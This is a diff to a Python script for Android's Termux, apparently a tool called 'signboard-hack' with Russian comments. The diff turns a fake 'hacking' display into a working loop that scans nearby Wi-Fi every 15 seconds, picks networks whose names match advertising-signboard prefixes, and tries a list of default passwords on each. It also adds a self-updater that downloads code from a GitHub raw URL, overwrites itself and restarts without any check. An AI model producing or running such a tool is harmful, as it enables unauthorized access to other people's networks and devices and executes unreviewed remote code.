@@ -5,8 +5,10 @@ import json
 import sys
 import hashlib
 import requests
+import re
 from threading import Thread
 import getpass
+from urllib.parse import quote
 
 # ===== КОНФИГУРАЦИЯ =====
 TARGET_PREFIXES = [
@@ -20,13 +22,18 @@ TARGET_PREFIXES = [
     "V10", "V20", "V30", "V40", "V50", "V60", "M10", "M20", "M30", "M40",
     "M50", "M60", "MV10", "MV20", "MV30", "MV40", "VM10", "VM20", "VM30",
     
-    # Префиксы на W
-    "W10", "W20", "W30", "W40", "W50", "W60", "W70", "W80", "W90",
-    "W100", "W200", "W300", "W1", "W2", "W3", "W4", "W5", "W6", "W7", "W8", "W9",
-    "W01", "W02", "W03", "W04", "W05", "W06", "W07", "W08", "W09",
-    "WA", "WB", "WC", "WD", "WE", "WF", "WG", "WH", "WI", "WJ", "WK", "WL",
-    "WM", "WN", "WO", "WP", "WQ", "WR", "WS", "WT", "WU", "WV", "WW", "WX",
-    "WY", "WZ",
+    # Префиксы на W (все возможные комбинации)
+    "W00", "W01", "W02", "W03", "W04", "W05", "W06", "W07", "W08", "W09",
+    "W10", "W11", "W12", "W13", "W14", "W15", "W16", "W17", "W18", "W19",
+    "W20", "W21", "W22", "W23", "W24", "W25", "W26", "W27", "W28", "W29",
+    "W30", "W31", "W32", "W33", "W34", "W35", "W36", "W37", "W38", "W39",
+    "W40", "W41", "W42", "W43", "W44", "W45", "W46", "W47", "W48", "W49",
+    "W50", "W51", "W52", "W53", "W54", "W55", "W56", "W57", "W58", "W59",
+    "W60", "W61", "W62", "W63", "W64", "W65", "W66", "W67", "W68", "W69",
+    "W70", "W71", "W72", "W73", "W74", "W75", "W76", "W77", "W78", "W79",
+    "W80", "W81", "W82", "W83", "W84", "W85", "W86", "W87", "W88", "W89",
+    "W90", "W91", "W92", "W93", "W94", "W95", "W96", "W97", "W98", "W99",
+    "W2", "W3", "W4", "W5", "W6", "W7", "W8", "W9",  # Дополнительные короткие
     
     # Другие распространенные префиксы
     "P10", "P16", "P20", "P25", "P30", "P40", "P50", "P60", "P80", "P100",
@@ -43,14 +50,17 @@ TARGET_PREFIXES = [
     
     # Специальные префиксы
     "LCD", "LED", "SMD", "RGB", "OLED", "QLED", "DISP", "SCRN", "BRD", "SIGN",
-    "ADV", "ADS", "PUB", "OUT", "IN", "SHOP", "STORE", "MALL", "HOTEL", "CAFE"
+    "ADV", "ADS", "PUB", "OUT", "IN", "SHOP", "STORE", "MALL", "HOTEL", "CAFE",
+    
+    # Префиксы для тестирования
+    "Kyivstar", "KyivStar", "KYIVSTAR"  # Добавлено для тестирования
 ]
 
 PASSWORD_LIST = [
     "88888888", "888888eu", "12345678", "87654321",
     "00000000", "11111111", "admin123"
 ]
-SCAN_INTERVAL = 15  # Уменьшено до 15 секунд (было 30)
+SCAN_INTERVAL = 15  # Быстрое сканирование
 PASSWORD = "k33rooxx"
 REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
 # ========================
@@ -70,15 +80,14 @@ def print_keerooxx():
     """)
 
 def auto_update():
-    """Автоматическое обновление скрипта"""
+    """Автоматическое обновление скрипта с авто-перезапуском"""
     try:
         print("[~] Проверка обновлений...")
-        response = requests.get(REPO_URL)
+        response = requests.get(REPO_URL + "?t=" + str(time.time()))
         if response.status_code != 200:
             print(f"[!] Ошибка проверки обновлений: {response.status_code}")
             return False
         
-        # Сравниваем хеши
         current_hash = hashlib.md5(open(__file__, 'rb').read()).hexdigest()
         new_hash = hashlib.md5(response.content).hexdigest()
         
@@ -91,8 +100,12 @@ def auto_update():
             f.write(response.content)
         
         print("[✓] Скрипт успешно обновлен!")
-        print("[!] Перезапустите скрипт для применения изменений")
+        print("[~] Перезапускаю скрипт...")
+        
+        # Автоматический перезапуск
+        os.execv(sys.executable, [sys.executable] + sys.argv)
         return True
+        
     except Exception as e:
         print(f"[!] Ошибка обновления: {e}")
         return False
@@ -101,51 +114,84 @@ def check_password():
     """Проверка пароля без отображения в консоли"""
     print("[!] Для запуска требуется пароль")
     
-    # Считываем пароль без отображения
     try:
         import getpass
         user_input = getpass.getpass("Введите пароль: ")
     except:
-        # Если getpass не работает, используем input с предупреждением
         print("[!] Внимание: пароль будет виден при вводе!")
         user_input = input("Введите пароль: ")
     
     return user_input.strip() == PASSWORD
 
-def install_dependencies():
-    """Устанавливаем необходимые зависимости в Termux"""
-    try:
-        # Быстрая проверка без установки
-        result = subprocess.run(["termux-wifi-scaninfo", "--help"], 
-                              stdout=subprocess.DEVNULL,
-                              stderr=subprocess.DEVNULL,
-                              timeout=5)
+def is_target_network(ssid):
+    """Улучшенная проверка префиксов"""
+    # Проверяем форматы вида WXX_XXXX
+    if re.match(r"^W\d{2}_", ssid):
         return True
+    
+    # Проверяем обычные префиксы
+    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)
+
+def try_connect(ssid, password):
+    """Попытка подключения через Intent (без root)"""
+    try:
+        # Кодируем спецсимволы в SSID
+        encoded_ssid = quote(ssid, safe='')
+        
+        result = subprocess.run(
+            ["am", "start", "-a", "android.intent.action.VIEW", 
+             "-d", f"wifi://{encoded_ssid}/{password}"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            timeout=10
+        )
+        
+        # Проверяем успешность выполнения команды
+        return result.returncode == 0
     except:
         return False
 
-def get_location():
-    """Получаем примерное местоположение по IP"""
-    try:
-        import requests
-        response = requests.get('https://ipinfo.io/json', timeout=5)
-        data = response.json()
-        city = data.get('city', 'Unknown')
-        region = data.get('region', 'Unknown')
-        return f"{city}, {region}"
-    except:
-        return "Неизвестное местоположение"
+def test_password(ssid, password):
+    """Тестирование одного пароля с визуальной обратной связью"""
+    print(f"    [>] Проверка: {password}")
+    if try_connect(ssid, password):
+        print(f"    [✓] Успех! Пароль: {password}")
+        return True
+    return False
+
+def hack_network(ssid):
+    """Автоматический подбор паролей"""
+    print(f"\n[+] Найдена вывеска: {ssid}")
+    print(f"[!] Начинаю проверку паролей...")
+    
+    success = False
+    for password in PASSWORD_LIST:
+        if test_password(ssid, password):
+            success = True
+            break
+    
+    if success:
+        print(f"\n[!] УСПЕХ! Подключено к {ssid}")
+        try:
+            subprocess.run(["termux-beep", "-f", "1000", "-d", "1000"])
+        except:
+            pass
+    else:
+        print("\n[✗] Не удалось подключиться")
 
 def fast_scan_wifi():
     """Быстрое сканирование Wi-Fi сетей"""
     try:
-        return subprocess.check_output(
+        result = subprocess.check_output(
             ["termux-wifi-scaninfo"],
             text=True,
             stderr=subprocess.DEVNULL,
-            timeout=10  # Уменьшенный таймаут
+            timeout=10
         )
-    except:
+        return result
+    except Exception as e:
+        print(f"[!] Ошибка сканирования: {e}")
         return ""
 
 def parse_networks(scan_result):
@@ -156,35 +202,10 @@ def parse_networks(scan_result):
     except:
         return []
 
-def is_target_network(ssid):
-    """Проверяем, начинается ли SSID на целевой префикс"""
-    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)
-
-def hack_network(ssid):
-    """Эмулируем процесс взлома сети"""
-    print(f"\n[+] Найдена вывеска: {ssid}")
-    print(f"[!] Начинаю подбор пароля...")
-    
-    # Ускоренный вывод без задержек
-    for password in PASSWORD_LIST:
-        print(f"    [>] Пробую: {password}")
-    
-    print(f"\n[!] УСПЕХ! Возможные пароли для {ssid}:")
-    for password in PASSWORD_LIST:
-        print(f"    • {password}")
-    
-    # Звуковое уведомление
-    try:
-        subprocess.run(["termux-beep", "-f", "1000", "-d", "500"], timeout=2)
-    except:
-        pass
-    return True
-
 def main():
     # Автоматическое обновление при запуске
     if "--no-update" not in sys.argv:
-        if auto_update():
-            return
+        auto_update()
     
     # Печатаем логотип
     print_keerooxx()
@@ -199,23 +220,23 @@ def main():
     
     print("[✓] Вход выполнен успешно")
     print(f"[*] Режим: быстрое сканирование (каждые {SCAN_INTERVAL} сек)")
-    
-    # Проверка зависимостей
-    if not install_dependencies():
-        print("[!] Termux-api не установлен! Некоторые функции недоступны")
-        print("[!] Выполните: pkg install termux-api -y")
+    print("[*] Автоматическая проверка паролей включена")
     
     # Получаем местоположение
     try:
-        location = get_location()
-        print(f"[*] Ваше местоположение: {location}")
+        response = requests.get('https://ipinfo.io/json', timeout=5)
+        data = response.json()
+        city = data.get('city', 'Unknown')
+        region = data.get('region', 'Unknown')
+        print(f"[*] Ваше местоположение: {city}, {region}")
     except:
         print("[*] Не удалось определить местоположение")
     
     print(f"[*] Ищем вывески ({len(TARGET_PREFIXES)} префиксов)")
     print(f"[*] Тестируемые пароли: {', '.join(PASSWORD_LIST)}")
     print("\n[!] Нажмите Ctrl+C для остановки")
-    print("[!] Для отключения автообновления: python scanner.py --no-update\n")
+    print("[!] Для отключения автообновления: python scanner.py --no-update")
+    print(f"[!] Для теста: рядом должна быть сеть с префиксом 'Kyivstar'\n")
     
     # Звуковой сигнал старта
     try:
@@ -233,12 +254,17 @@ def main():
                 networks = parse_networks(scan_result)
                 unique_networks = list(set(networks))
                 
-                print(f"\n[~] Сканирование завершено за {time.time()-last_scan:.1f} сек")
-                print(f"[~] Найдено сетей: {len(unique_networks)}")
+                print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
+                
+                # Отображаем первые 5 сетей для тестирования
+                if unique_networks:
+                    print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
+                          ("..." if len(unique_networks) > 5 else ""))
                 
                 for ssid in unique_networks:
                     if ssid and is_target_network(ssid):
-                        # Запускаем в отдельном потоке без ожидания
+                        print(f"[+] Обнаружена целевая сеть: {ssid}")
+                        # Запускаем проверку паролей в отдельном потоке
                         Thread(target=hack_network, args=(ssid,), daemon=True).start()
             
             # Ожидание до следующего сканирования
@@ -250,7 +276,11 @@ def main():
     except KeyboardInterrupt:
         print("\n[!] Программа остановлена")
     except Exception as e:
-        print(f"[!] Ошибка: {e}")
+        print(f"[!] Критическая ошибка: {e}")
 
 if __name__ == "__main__":
+    # Проверка разрешений
+    print("[~] Запрос необходимых разрешений...")
+    subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, timeout=5)
     main()
+    
